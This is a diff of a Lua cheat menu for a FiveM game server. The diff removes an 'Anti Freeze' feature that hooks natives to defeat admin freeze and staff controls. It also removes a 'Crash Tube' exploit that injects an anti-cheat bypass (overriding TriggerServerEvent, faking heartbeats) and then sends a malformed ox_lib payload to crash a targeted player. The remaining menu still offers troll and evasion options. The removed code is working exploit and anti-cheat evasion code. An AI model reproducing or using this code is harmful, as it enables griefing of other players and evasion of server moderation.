@@ -48,7 +48,6 @@ Menu.State = {
     shootVisionTarget = nil,
     shootVisionRadiusPx = 80.0,
     antiTpActive = false,
-    antiFreezeActive = false,
     antiHeadshotActive = false,
     lastNavTime = 0,
     menuLastSwitchTime = 0,
@@ -313,13 +312,11 @@ function Menu.Helpers.GetPlayerOptions()
         "Solo Session",
         "Noclip",
         "Anti Headshot",
-        "Anti Freeze",
         "Anti-Teleport",
         "Staff Mode"
     }
 end
 
-Menu.State.antiFreezeActive = false
 Menu.State.antiTpActive = true
 Menu.State.antiHeadshotActive = false
 
@@ -454,7 +451,6 @@ Menu.Data.Options.Troll = {
     "Spectate",
     "Bug Vehicle",
     "Bug Player",
-    "Crash Tube",
     "Attach Anim",
     "Broke Vehicle"
 }
@@ -2144,151 +2140,6 @@ function Menu.Actions.ToggleNoclip()
     end
 end
 
-function Menu.Actions.ToggleAntiFreeze(enable)
-    Menu.State.antiFreezeActive = enable
-    
-    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
-        -- Notification with theme support
-        if enable then
-            ShowDynastyNotification("Anti-Freeze (Bypass Putin): ~g~ON")
-        else
-            ShowDynastyNotification("Anti-Freeze (Bypass Putin): ~r~OFF")
-        end
-
-        Citizen.CreateThread(function()
-            local nativeCode = string.format([[
-                local susano = rawget(_G, "Susano")
-                _G.AntiFreezeEnabled = %s
-
-                if not _G.AntiFreezeHookInstalled and susano and type(susano.HookNative) == "function" then
-                    _G.AntiFreezeHookInstalled = true
-
-                    -- Intercepte FreezeEntityPosition (Empêche le jeu de te geler)
-                    susano.HookNative(0x428CA6FAC10A06E5, function(entity, toggle)
-                        if _G.AntiFreezeEnabled then
-                            local ped = PlayerPedId()
-                            if entity == ped or entity == GetVehiclePedIsIn(ped, false) then
-                                if toggle == true then
-                                    return false -- Blocage instantané
-                                end
-                            end
-                        end
-                        return true
-                    end)
-                    
-                    -- Intercepte SetEntityCollision (Empêche de passer sous la map)
-                    susano.HookNative(0x1A9205C1B9EE827F, function(entity, toggle, keepPhysics)
-                        if _G.AntiFreezeEnabled and entity == PlayerPedId() and toggle == false then
-                            return false 
-                        end
-                        return true
-                    end)
-
-                    -- Anti-Admin: Intercepte SetEntityVisible
-                    susano.HookNative(0xEA1C610A04DB6BBB, function(entity, toggle, p2)
-                        if _G.AntiFreezeEnabled and entity == PlayerPedId() and toggle == false then
-                            return false
-                        end
-                        return true
-                    end)
-
-                    -- Anti-Admin: ClearPedTasksImmediately
-                    susano.HookNative(0xAAA3432F, function(ped)
-                        if _G.AntiFreezeEnabled and ped == PlayerPedId() then
-                            return false
-                        end
-                        return true
-                    end)
-
-                    -- Anti-Admin: TaskLeaveVehicle
-                    susano.HookNative(0xD3DB1A0789384461, function(ped, vehicle, flags)
-                        if _G.AntiFreezeEnabled and ped == PlayerPedId() then
-                            return false
-                        end
-                        return true
-                    end)
-                end
-            ]], tostring(enable))
-            Susano.InjectResource("AntiFreezeHook", nativeCode)
-
-            Citizen.Wait(50)
-
-            -- LAYER 2: Event Interception (Inject into Putin resource)
-            local eventCode = string.format([[
-            if _G.AntiFreezeEnabled == nil then _G.AntiFreezeEnabled = false end
-            _G.AntiFreezeEnabled = %s
-
-            if not _G.AntiFreezeHooksInstalled then
-                _G.AntiFreezeHooksInstalled = true
-
-                AddEventHandler("admin:FreezePlayer", function(freezeState)
-                    if _G.AntiFreezeEnabled then
-                        -- force le freeze a false pour ne pas etre geler
-                        TriggerEvent("admin:FreezePlayer", false)
-                        CancelEvent()
-                    end
-                end)
-            end
-            ]], tostring(enable))
-            Susano.InjectResource("Putin", eventCode)
-        end)
-    else
-        ShowDynastyNotification("~r~Erreur : Susano n'est pas disponible")
-    end
-end
-
--- Anti Freeze thread
--- Anti Freeze thread (Fixed: Only clear tasks ONCE, loop unfreeze state)
-Citizen.CreateThread(function()
-    local wasActive = false
-    while true do
-        if Menu.State.antiFreezeActive and not Menu.State.noclipActive and not Menu.State.Freecam.active then
-            local ped = PlayerPedId()
-            
-            -- On First Activation: Clear Tasks Once
-            if not wasActive then
-                 if DoesEntityExist(ped) then 
-                    ClearPedTasksImmediately(ped) 
-
-                 end
-                 wasActive = true
-            end
-            
-            if DoesEntityExist(ped) then
-                -- Aggressive Unfreeze (Fallback for non-hook situations)
-                FreezeEntityPosition(ped, false)
-                SetEntityCollision(ped, true, true)
-                
-                -- Detach if attached (e.g. carried by admin)
-                if IsEntityAttached(ped) then
-                    DetachEntity(ped, true, true)
-                end
-                
-                -- Enable Vital Controls (In case blocked by Staff Menu)
-                EnableControlAction(0, 30, true) -- Move X
-                EnableControlAction(0, 31, true) -- Move Y
-                EnableControlAction(0, 21, true) -- Sprint
-                EnableControlAction(0, 22, true) -- Jump
-                EnableControlAction(0, 23, true) -- Enter Veh
-                EnableControlAction(0, 24, true) -- Attack (Shoot)
-                EnableControlAction(0, 25, true) -- Aim
-                EnableControlAction(0, 71, true) -- Veh Accelerate
-                EnableControlAction(0, 72, true) -- Veh Brake
-                EnableControlAction(0, 75, true) -- Exit Veh
-                
-                local veh = GetVehiclePedIsIn(ped, false)
-                if veh and veh ~= 0 then
-                    FreezeEntityPosition(veh, false)
-                    SetEntityCollision(veh, true, true)
-                end
-            end
-        else
-            wasActive = false
-        end
-        Citizen.Wait(0)
-    end
-end)
-
 -- Old Anti-TP Thread removed in favor of ToggleAntiTeleport function
 
 function Menu.Actions.HealPlayer()
@@ -3726,165 +3577,6 @@ function Menu.Actions.HijackPlayerVehicle()
     end
 end
 
-function Menu.Actions.CrashTube()
-    if not selectedPlayer then 
-        ShowDynastyNotification("~r~Aucun joueur sélectionné pour Crash Tube !")
-        return 
-    end
-
-    local targetServerId = selectedPlayer.serverId
-    local clientId = GetPlayerFromServerId(targetServerId)
-
-    if not clientId or clientId == -1 then
-        ShowDynastyNotification("~r~Le joueur n'est pas synchronisé dans ta zone (clientId invalide).")
-        return
-    end
-
-    local targetPed = GetPlayerPed(clientId)
-    if not targetPed or not DoesEntityExist(targetPed) then
-        ShowDynastyNotification("~r~Le Ped du joueur ("..tostring(targetPed)..") n'existe pas ou est trop loin.")
-        return
-    end
-    
-    ShowDynastyNotification("~y~Injection de Crash Tube sur " .. selectedPlayer.name .. "...")
-
-    -- 1. Injection globale dans Putin (Bypass AC + Payload)
-    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
-        Susano.InjectResource("Putin", [[
-            Citizen.CreateThread(function()
-                -- ============================================
-                -- PUTIN AC BYPASS HOOKS
-                -- ============================================
-                local _zeubiiii = TriggerServerEvent
-                local _zouzzie = GetStateBagValue
-                
-                GetEntityScript = function() return nil end
-                IsEntityGhostedToLocalPlayer = function() return false end
-                
-                TriggerServerEvent = function(eventName, ...)
-                    if type(eventName) == "string" and eventName:find('PutinAC') then
-                        return
-                    end
-                    return _zeubiiii(eventName, ...)
-                end
-                
-                GetInvokingResource = function()
-                    return nil
-                end
-                
-                GetStateBagValue = function(bag, key)
-                    if key == 'doCheckPlayerPed' then
-                        return false
-                    end
-                    if _zouzzie then return _zouzzie(bag, key) else return nil end
-                end
-
-                -- Heartbeat Loop
-                Citizen.CreateThread(function()
-                    local decorName = "PutinBypassTime"
-                    pcall(DecorRegister, decorName, 3)
-                    
-                    while true do
-                        local time = GetGameTimer()
-                        pcall(function() 
-                            if LocalPlayer and LocalPlayer.state then
-                                LocalPlayer.state:set('PutinBypassHeartbeat', time, false) 
-                            end
-                        end)
-                        
-                        local ped = PlayerPedId()
-                        if DoesEntityExist(ped) then
-                            pcall(DecorSetInt, ped, decorName, time)
-                        end
-                        
-                        Wait(1000)
-                    end
-                end)
-                
-                -- ============================================
-                -- NORMAL TUBE EXPLOIT LOGIC
-                -- ============================================
-                
-                -- Petite pause le temps que le hook ci-dessus s'active dans ce thread
-                Wait(250)
-                
-                local tubeModel = "stt_prop_stunt_tube_crn"
-                local tubeHash = GetHashKey(tubeModel)
-                RequestModel(tubeHash)
-                local attempts = 0
-                while not HasModelLoaded(tubeHash) and attempts < 100 do
-                    Wait(10)
-                    attempts = attempts + 1
-                end
-                
-                if HasModelLoaded(tubeHash) then
-                    local targetPed = ]] .. tostring(targetPed) .. [[ 
-                    if not DoesEntityExist(targetPed) then return end
-                    
-                    local coords = GetEntityCoords(targetPed)
-                    local tube = CreateObject(tubeHash, coords.x, coords.y, coords.z, true, true, true)
-                    
-                    if tube and DoesEntityExist(tube) then
-                        SetEntityAsMissionEntity(tube, true, true)
-                        
-                        -- Anti-Cheat Protection: On bloque la suppression de NOTRE objet
-                        _G.CrashTubeId = tube
-                        local susanoApi = rawget(_G, "Susano")
-                        if type(susanoApi) == "table" and type(susanoApi.HookNative) == "function" and not _G.CrashTubeHooks then
-                            _G.CrashTubeHooks = true
-                            susanoApi.HookNative(0xAE3CBE5BF394C9C9, function(entity)
-                                if _G.CrashTubeId and _G.CrashTubeId ~= 0 and entity == _G.CrashTubeId then return false end
-                                return true
-                            end)
-                            susanoApi.HookNative(0x539E0AE3E6634B9F, function(entity)
-                                if _G.CrashTubeId and _G.CrashTubeId ~= 0 and entity == _G.CrashTubeId then return false end
-                                return true
-                            end)
-                            susanoApi.HookNative(0xB736A491E64A32CF, function(entity)
-                                if _G.CrashTubeId and _G.CrashTubeId ~= 0 and entity == _G.CrashTubeId then return false end
-                                return true
-                            end)
-                        end
-                        
-                        -- Attachement
-                        AttachEntityToEntity(tube, targetPed, GetPedBoneIndex(targetPed, 11816), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
-                        
-                        -- Payload corrompue
-                        local oxCrashData = {
-                            action = "start",
-                            id = math.random(1000, 9999),
-                            data = {
-                                label = "SYSTEM FAILURE",
-                                duration = 5000,
-                                useWhileDead = false,
-                                canCancel = false,
-                                network = true,
-                                disable = { car = true },
-                                prop = {
-                                    model = tubeModel,
-                                    -- pos n'est pas défini, donc c'est nil
-                                }
-                            }
-                        }
-                        
-                        -- Déclencher l'erreur sur le serveur (depuis Putin mais ça passera car on utilise la vraie fonction non-hook côté serveur)
-                        _zeubiiii("ox_lib:progress", oxCrashData)
-                        
-                        Wait(100)
-                        
-                        -- Nettoyage global
-                        if DoesEntityExist(tube) then
-                            DetachEntity(tube, true, true)
-                            -- DeleteEntity(tube) -- Commenté pour que le prop tombe par terre au lieu de disparaître
-                            _G.CrashTubeId = 0
-                            _G.CrashTubeHooks = false
-                        end
-                    end
-                end
-            end)
-        ]])
-    end
-end
 
 function Menu.Actions.LaunchPlayer()
     -- if not Menu.State.bypassLoaded then ShowDynastyNotification("~r~Bypass Required!") return end
@@ -5135,7 +4827,7 @@ function Menu.Actions.RenderMenu()
     local leftX_px = (baseX - menuWidth/2) * sw
 
     -- Side Menu (Emotes) if selected
-    if Menu.State.currentMenu == "TROLL" and Menu.State.selectedOption == 12 then
+    if Menu.State.currentMenu == "TROLL" and Menu.State.selectedOption == 10 then
         Menu.Helpers.RenderSideEmoteMenu(leftX_px, listTop_px, menuW_px, menuScale)
     end
     
@@ -5205,9 +4897,8 @@ function Menu.Actions.RenderMenu()
                     sliderMin = 0.1
                     sliderMax = 20.0
                 elseif index == 5 then label = "Anti Headshot"; isToggle = true; toggleActive = Menu.State.antiHeadshotActive
-                elseif index == 6 then label = "Anti Freeze"; isToggle = true; toggleActive = Menu.State.antiFreezeActive
-                elseif index == 7 then label = "Anti-Teleport"; isToggle = true; toggleActive = Menu.State.antiTpActive
-                elseif index == 8 then label = "Staff Mode"; isToggle = true; toggleActive = Menu.State.staffModeActive
+                elseif index == 6 then label = "Anti-Teleport"; isToggle = true; toggleActive = Menu.State.antiTpActive
+                elseif index == 7 then label = "Staff Mode"; isToggle = true; toggleActive = Menu.State.staffModeActive
                 else label = data end
             elseif Menu.State.currentMenu == "COMBAT" then
                 if index == 3 then 
@@ -5256,12 +4947,11 @@ function Menu.Actions.RenderMenu()
                 elseif index == 7 then label = "Spectate"; isToggle = true; toggleActive = Menu.State.spectateActive
                 elseif index == 8 then label = "Bug Vehicle"
                 elseif index == 9 then label = "Bug Player"
-                elseif index == 10 then label = "Crash Tube"
-                elseif index == 11 then 
+                elseif index == 10 then 
                     local types = {twerk="Twerk", fuck="Baise", wank="Branlette", piggyback="Piggyback"}
                     label = "Attach Anim"
                     badgeOverride = types[interactEmoteType] or ""
-                elseif index == 12 then label = "Broke Vehicle"
+                elseif index == 11 then label = "Broke Vehicle"
                 else label = data end
             elseif Menu.State.currentMenu == "SETTINGS" then
                 if index == 1 then
@@ -5614,15 +5304,13 @@ function ExecuteMenuAction(menu, index, listOverride)
             elseif index == 9 then
                 Menu.Actions.BugPlayer()
             elseif index == 10 then
-                Menu.Actions.CrashTube()
-            elseif index == 11 then
                 if sideMenuFocus then
                     local types = {"twerk", "fuck", "wank", "piggyback"}
                     Menu.Actions.ToggleInteractEmote(types[sideMenuOption])
                 else
                     sideMenuFocus = true
                 end
-            elseif index == 12 then
+            elseif index == 11 then
                 Menu.Actions.TrollBrokeAll()
             end
         end)
@@ -5659,12 +5347,10 @@ function ExecuteMenuAction(menu, index, listOverride)
          elseif index == 5 then
              Menu.Actions.ToggleAntiHeadshot(not Menu.State.antiHeadshotActive)
           elseif index == 6 then
-              Menu.Actions.ToggleAntiFreeze(not Menu.State.antiFreezeActive)
-         elseif index == 7 then
              Menu.Actions.ToggleAntiTeleport(not Menu.State.antiTpActive)
-         elseif index == 8 then
+          elseif index == 7 then
              Menu.Actions.ToggleStaffMode()
-         end
+          end
 
     elseif menu == "COMBAT" then
         if index == 1 then
@@ -5897,7 +5583,7 @@ CreateThread(function()
                         Menu.State.selectedOption, Menu.State.startIndex = 1, 1
                         PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                     end
-                elseif Menu.State.currentMenu == "TROLL" and Menu.State.selectedOption == 12 then
+                elseif Menu.State.currentMenu == "TROLL" and Menu.State.selectedOption == 10 then
                     if leftPressed then sideMenuFocus = false
                     elseif rightPressed then sideMenuFocus = true end
                 else
